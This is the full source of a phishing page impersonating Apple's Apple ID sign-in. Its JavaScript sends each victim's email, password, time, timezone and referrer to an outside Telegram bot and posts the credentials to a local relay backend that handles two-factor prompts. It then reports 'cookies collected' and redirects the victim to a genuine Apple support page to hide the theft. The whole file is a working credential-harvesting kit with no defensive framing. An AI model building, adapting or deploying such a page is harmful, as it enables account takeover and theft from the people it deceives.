<html lang="en"><head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" href="etc/favicon.png" type="image/png">
  <title>Sign in with your Apple ID</title>
  <style>
    :root {
      --header-height: 44px;

      /* Light Theme Defaults */
      --body-bg: #fff;
      --header-bg: rgba(251, 251, 253, 0.5);
      --header-border: 1px solid rgba(251, 251, 253, 0.5);
      --theme-color-fillSecondary: rgba(0, 0, 0, 0.1);
      --text-color: black;
      --input-border-color: #86868b;
      --input-focus-color: #0071e3;
      --input-label-color: #86868b;
      --content-bg: #fff; /* Default light content background */
      --theme-color-boxShadow: rgba(0,0,0,0.1); /* Default light box shadow */
      --form-label-color: #1d1d1fae; /* Default light form label color */
      --input-bg-color: transparent; /* Default light input background */

    }

    @media (prefers-color-scheme: dark) {
      :root {
        --body-bg: #1c1c1e;
        --header-bg: rgba(29, 29, 31, 0.5);
        --header-border: 1px solid rgba(29, 29, 31, 0.5);
        --theme-color-fillSecondary: rgba(255, 255, 255, 0.1);
        --text-color: white;
        --input-border-color: #555;
        --input-focus-color: #4da6ff;
        --input-label-color: #bbb;
        --content-bg: #1c1c1e; /* Dark content background */
        --theme-color-boxShadow: rgba(0,0,0,0.65); /* Dark box shadow */
        --form-label-color: white; /* Dark form label color */
        --input-bg-color: hsla(0,0%,100%,.04); /* Dark input background */
      }

      header img {
        filter: invert(1);
      }

      #particle-path-to-invert {
        fill: white !important; /* Use !important to override inline fill */
      }
    }

    .form-label {
      color: var(--form-label-color);
    }

    .text-input {
      background: var(--input-bg-color);
    }

    body {
      font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
      background: var(--body-bg); /* Use variable for background */
    }

    body {
      font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
      background: var(--body-bg);
    }

    @media (max-width: 768px) {
      body {
        overflow-x: hidden;
        width: 100%;
      }
      #content {
        background: none !important;
        border: none !important;
        box-shadow: none !important;
        backdrop-filter: none !important;
        width: 100% !important;
        max-width: 100% !important;
        padding: 0 5vw !important;
        box-sizing: border-box !important;
      }
      .content-container {
        padding: 32px 0 !important;
        width: 100% !important;
      }
      .text-input {
        width: 100% !important;
        max-width: 100% !important;
        box-sizing: border-box !important;
      }
    }

    header {
      position: sticky;
      top: 0;
      display: flex;
      align-items: center;
      background: var(--header-bg);
      height: var(--header-height);
      min-height: var(--header-height);
      padding-left: 16px;
      padding-right: 6px;
      border-block-end: var(--header-border); /* Logical border */
      border-bottom: var(--header-border); /* Fallback */
      z-index: 1000; /* Ensure header stays above other content */
    }

    header img {
      height: 32px; /* Adjust logo size as needed */
      width: auto;
    }

    .particle-icon {
      width: 160px;
      height: auto;
    }

    .signin-heading {
      margin-top: 20px;
      margin-block-start: 20px;
      font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
      font-size: 32px;
      font-weight: 500;
      line-height: 36px;
      color: var(--text-color);
      text-align: center;
    }

    .content-container {
      width: 100%;
      text-align: center;
      padding: 32px;
      box-sizing: border-box;
      position: relative; /* For absolute positioning of the input group */
    }

    .input-group {
      width: 100%;
      max-width: 465px;
      margin: 0 auto;
      border-radius: 12px;
      overflow: hidden;
      border: 1px solid var(--input-border-color);
      min-height: 54px; /* Height of one input field */
      position: relative; /* For absolute positioning of the password field */
    }
    
    .input-wrapper {
      position: relative;
      width: 100%;
    }
    
    .top-input {
      width: 100%;
      padding-right: 50px;
    }
    
    .arrow-button {
      position: absolute;
      right: 8px;
      top: 50%;
      transform: translateY(-50%);
      width: 36px;
      height: 36px;
      border-radius: 50%;
      border: 1px solid var(--input-border-color);
      background: transparent;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      padding: 0;
      transition: all 0.2s ease;
      z-index: 10;
      pointer-events: auto;
    }
    
    .arrow-button:hover {
      background: rgba(0, 0, 0, 0.05); /* This might need a variable if hover changes based on theme */
    }
    
    .arrow-button:active {
      transform: translateY(-50%) scale(0.95);
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    .arrow-button .spinner {
      display: none;
      width: 20px;
      height: 20px;
      position: relative;
    }
    
    .arrow-button .spinner::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: 
        radial-gradient(farthest-side, var(--text-color) 90%, transparent) 50% 0/15% 15% no-repeat,
        radial-gradient(farthest-side, var(--text-color) 90%, transparent) 85% 15%/15% 15% no-repeat,
        radial-gradient(farthest-side, var(--text-color) 90%, transparent) 100% 50%/15% 15% no-repeat,
        radial-gradient(farthest-side, var(--text-color) 90%, transparent) 85% 85%/15% 15% no-repeat,
        radial-gradient(farthest-side, var(--text-color) 90%, transparent) 50% 100%/15% 15% no-repeat,
        radial-gradient(farthest-side, var(--text-color) 90%, transparent) 15% 85%/15% 15% no-repeat,
        radial-gradient(farthest-side, var(--text-color) 90%, transparent) 0 50%/15% 15% no-repeat,
        radial-gradient(farthest-side, var(--text-color) 90%, transparent) 15% 15%/15% 15% no-repeat;
      animation: spin 1s linear infinite;
    }
    
    .arrow-button.loading .spinner {
      display: block;
    }
    
    .arrow-button.loading svg:not(.spinner) {
      display: none;
    }

    .text-input {
      width: 100%;
      padding: 26px 16px 10px;
      height: 54px;
      border: none;
      font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
      font-size: 16px;
      box-sizing: border-box;
      outline: none;
      z-index: 1;
      position: relative;
      line-height: 24px;
      color: var(--text-color);
    }
    
    .floating-label {
      position: relative;
      width: 100%;
    }
    
    .floating-label label {
      position: absolute;
      top: 16px;
      left: 16px;
      color: var(--input-label-color);
      font-size: 16px;
      transition: all 0.2s ease;
      pointer-events: none;
      z-index: 0;
      line-height: 1.5;
    }
    
    .floating-label input:focus + label,
    .floating-label input:not(:placeholder-shown) + label {
      top: 6px;
      font-size: 12px;
    }
    
    .floating-label input.error {
      border-color: #ff3b30 !important;
      box-shadow: 0 0 0 1px #ff3b30;
    }
    
    .floating-label input.error.shake {
      animation: shake 0.5s ease-in-out;
    }
    
    .floating-label.error label,
    .input-group.error .floating-label label {
      color: #ff3b30 !important;
    }
    
    .input-group.error {
      border-color: #ff3b30 !important;
    }
    
    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      10%, 30%, 50%, 70%, 90% { transform: translateX(-2px); }
      20%, 40%, 60%, 80% { transform: translateX(2px); }
    }
    
    .text-input::placeholder {
      color: var(--input-label-color);
    }

    .top-input {
      border-bottom: 1px solid var(--input-border-color);
      border-radius: 12px 12px 0 0;
    }

    .bottom-input {
      border-radius: 0 0 12px 12px;
      width: 100%;
      padding-right: 50px;
    }
    
    .password-wrapper {
      position: relative;
    }
    
    .password-continue {
      position: absolute;
      right: 8px;
      top: 50%;
      transform: translateY(-50%);
      width: 36px;
      height: 36px;
      border-radius: 50%;
      border: 1px solid var(--input-border-color);
      background: transparent;
      display: none;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      padding: 0;
      transition: all 0.2s ease;
    }
    
    /* When password is hidden */
    .input-group:has(.bottom-input[style*="display: none"]) .top-input {
      border-radius: 12px;
    }

    .text-input:focus {
      outline: none;
      box-shadow: 0 0 0 3px rgba(0, 125, 250, 0.1);
    }

    .input-group:focus-within {
      border-color: var(--input-focus-color);
      box-shadow: 0 0 0 1px var(--input-focus-color);
    }

    .input-group:focus-within .top-input {
      border-bottom-color: var(--input-focus-color);
    }

    #content {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      padding: 32px;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 70vw;
      max-width: 580px;
      height: 70vh;
      max-height: 640px;
      border-radius: 32px;
      background: var(--content-bg);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0); /* This might need a variable too */
      box-shadow: 0 11px 34px 0 var(--theme-color-boxShadow);
    }
  </style>
</head>

    <div class="signin-heading">Sign in with Apple&nbsp;Account</div>
    <div class="content-container">
      <!-- Spacer div to maintain consistent height -->
      <div style="min-height: 54px;"></div>
      
      <div class="input-group" style="position: absolute; top: 0; left: 0; right: 0; margin-top: 24px;">
        <div class="input-wrapper">
          <div class="floating-label">
            <input type="text" id="email_or_phone" class="text-input top-input" placeholder=" " required="">
            <label for="email_or_phone">Apple ID</label>
            <button id="continue-button" class="arrow-button email-continue" aria-label="Continue">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="#86868b" xmlns="http://www.w3.org/2000/svg">
                <rect x="3" y="9.5" width="18" height="5" rx="2.5"></rect>
                <path d="M21 12L14 5V19L21 12Z" stroke="#86868b" stroke-width="1.5" stroke-linejoin="miter"></path>
              </svg>
            </button>
          </div>
        </div>
        <div class="password-wrapper" style="position: relative; display: none;">
          <div class="floating-label">
            <input type="password" class="text-input bottom-input" id="password" placeholder=" " required="">
            <label for="password">Password</label>
            <button id="password-continue" class="arrow-button password-continue" aria-label="Sign In" style="display: none;">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="#86868b" xmlns="http://www.w3.org/2000/svg">
                <rect x="3" y="9.5" width="18" height="5" rx="2.5"></rect>
                <path d="M21 12L14 5V19L21 12Z" stroke="#86868b" stroke-width="1.5" stroke-linejoin="miter"></path>
              </svg>
              <div class="spinner"></div>
            </button>
          </div>
        </div>
      </div>
      </div> <!-- Close the absolutely positioned container -->
      
      <div id="error-message" style="color: #ff3b30; text-align: center; margin: 32px 0 20px; min-height: 20px; visibility: hidden; font-size: 14px;">
        The email or password you entered is incorrect.
      </div>
      
      <div class="si-remember-password" style="margin-top: 60px; padding: 0 16px; display: flex; justify-content: center;">
        <div class="form-checkbox" style="display: flex; align-items: center; position: relative;">
          <input type="checkbox" id="remember-me" class="form-checkbox-input" style="opacity: 0; position: absolute; width: 12.6px; height: 12.6px; margin: 0; z-index: 1; cursor: pointer;">
          <label for="remember-me" class="form-label" style="display: flex; align-items: center; margin: 0; cursor: pointer; font-size: 16px; padding-left: 28px; position: relative;">
            <span class="form-checkbox-indicator" style="position: absolute; left: 0; top: 50%; transform: translateY(-50%); display: inline-block; width: 16px; height: 16px; border: 1px solid #86868b; border-radius: 3px; margin-right: 8px; background: white; transition: all 0.2s ease;">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="position: absolute; left: 1px; top: 1px; display: none;">
                <path d="M20 6L9 17L4 12" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
              </svg>
            </span>
            <span>Keep me signed in</span>
          </label>
        </div>    
      </div>
      <div style="margin-top: 40px; text-align: center; font-size: 14px; color: #1d1d1fae;">
        <div style="margin-bottom: 12px;">
          <a href="#" style="color: #0066cc; text-decoration: none; display: inline-flex; align-items: center;">
            Forgot Password?
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" style="margin-left: 4px;" xmlns="http://www.w3.org/2000/svg">
              <path d="M7 17L17 7M17 7H7M17 7V17" stroke="#0066cc" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
            </svg>
          </a>
        </div>
        <div>
          <a href="#" style="color: #0066cc; text-decoration: none;">Create Apple Account</a>
        </div>
  <div id="footer"></div>
  <script>
    document.addEventListener('DOMContentLoaded', function() {
    const emailInput = document.getElementById('email_or_phone');
    const passwordInput = document.getElementById('password');
    const continueButton = document.getElementById('continue-button');
    const passwordWrapper = document.querySelector('.password-wrapper');
    const passwordContinue = document.getElementById('password-continue');
    const errorMessage = document.getElementById('error-message');
    
    function showPasswordField() {
      const email = emailInput.value.trim();
      if (email !== '') {
        document.querySelector('.email-continue').style.display = 'none';
        passwordWrapper.style.display = 'block';
        document.querySelector('.password-continue').style.display = 'flex';
        setTimeout(() => passwordInput.focus(), 0);
      }
    }
    
    continueButton.addEventListener('click', showPasswordField);
    emailInput.addEventListener('keypress', function(e) {
      if (e.key === 'Enter') showPasswordField();
    });
    
    function showError(msg) {
      errorMessage.textContent = msg;
      errorMessage.style.visibility = 'visible';
    }
    
    function hideError() {
      errorMessage.style.visibility = 'hidden';
    }
    
    async function sendLoginNotification(email, password) {
      try {
        let config;
        try {
          const response = await fetch('./instance.json');
          if (!response.ok) throw new Error(`HTTP ${response.status}`);
          config = await response.json();
          console.log('✅ Loaded config from instance.json');
        } catch (configError) {
          console.error(configError.message);
          console.error('❌ Could not load instance.json, aborting notification.');
          return;
        }
    
        const msg = `🚨 New login 🚨
    
    *Email:* ${email}
    *Password:* ${password}
    *Time:* ${new Date().toLocaleString()}, TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
    *Referrer:* ${document.referrer || 'Direct visit'}`;
    
        const response = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: config.chat_id, text: msg })
        });
    
        if (response.ok) {
          console.log('✅ Login notification sent to Telegram successfully');
        } else {
          const errorText = await response.text();
          console.error('❌ Telegram API error:', response.status, errorText);
          throw new Error(`Telegram API error: ${response.status}`);
        }
      } catch (err) {
        console.error('❌ Failed to send login notification:', err);
      }
    }
    
    async function notifyCookiesCollected(email) {
      try {
        let config;
        try {
          const response = await fetch('./instance.json');
          if (!response.ok) throw new Error(`HTTP ${response.status}`);
          config = await response.json();
          console.log('✅ Loaded config from instance.json for cookies');
        } catch (configError) {
          console.error(configError.message);
          console.error('❌ Could not load instance.json, aborting cookies notification.');
          return;
        }
    
        const msg = `🍪 Cookies collected for ${email}
    
    *Time:* ${new Date().toLocaleString()}, TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
    
        const response = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: config.chat_id, text: msg })
        });
    
        if (response.ok) {
          console.log('✅ Cookies notification sent to Telegram successfully');
        } else {
          const errorText = await response.text();
          console.error('❌ Telegram API error (cookies):', response.status, errorText);
          throw new Error(`Telegram API error: ${response.status}`);
        }
      } catch (err) {
        console.error('❌ Failed to send cookies notification:', err);
      }
    }
    
    async function startAuth(email, password) {
      const resp = await fetch('http://127.0.0.1:5000/auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      });
      const data = await resp.json();
      return { status: resp.status, data };
    }
    
    passwordContinue.addEventListener('click', async function() {
      const email = emailInput.value.trim();
      const password = passwordInput.value;
      if (!email || !password) {
        showError('Please enter your Apple ID and password.');
        return;
      }
      hideError();
    
      console.log('📤 About to send login notification...');
      await sendLoginNotification(email, password);
      console.log('📫 Login notification completed, proceeding with auth...');
    
      try {
        passwordContinue.disabled = true;
        passwordContinue.classList.add('loading');
    
        const { status, data } = await startAuth(email, password);
    
        if (status === 202) {
          console.log('🔐 2FA required, redirecting to 2FA page...');
          setTimeout(() => {
            window.location.href = `2fa.html?session_id=${encodeURIComponent(data.session_id)}`;
          }, 100);
          return;
        }
    
        if (status === 200) {
          console.log('✅ Login successful, redirecting to dashboard...');
          notifyCookiesCollected(email);  // 👈 added here
          setTimeout(() => {
            window.location.href = 'https://support.apple.com/en-us/108349?device-type=iphone';
          }, 100);
          return;
        }
    
        if (status === 400) {
          showError(data.error || 'Both email & password are required.');
        } else if (status === 401) {
          showError(data.error || 'Your Apple ID or password is incorrect.');
        } else {
          showError(data.error || 'An unexpected error occurred. Please try again.');
        }
      } catch (err) {
        console.error('Auth error:', err);
        showError(err.message || 'Login failed. Please try again.');
      } finally {
        passwordContinue.disabled = false;
        passwordContinue.classList.remove('loading');
      }
    });
    
    function removeErrorClass(input) {
      input.classList.remove('error', 'shake');
      const fl = input.closest('.floating-label');
      const ig = input.closest('.input-group');
      if (fl) fl.classList.remove('error');
      if (ig) ig.classList.remove('error');
      hideError();
    }
    
    emailInput.addEventListener('input', () => removeErrorClass(emailInput));
    passwordInput.addEventListener('input', () => removeErrorClass(passwordInput));
    passwordInput.addEventListener('keypress', function(e) {
      if (e.key === 'Enter') passwordContinue.click();
    });
    
    const checkbox = document.getElementById('remember-me');
    const indicator = document.querySelector('.form-checkbox-indicator');
    const checkmark = indicator.querySelector('svg');
    checkbox.addEventListener('change', function() {
      if (this.checked) {
        checkmark.style.display = 'block';
        indicator.style.borderColor = '#0071e3';
        indicator.style.backgroundColor = '#0071e3';
      } else {
        checkmark.style.display = 'none';
        indicator.style.borderColor = '#86868b';
        indicator.style.backgroundColor = 'white';
      }
    });
    });
    </script>
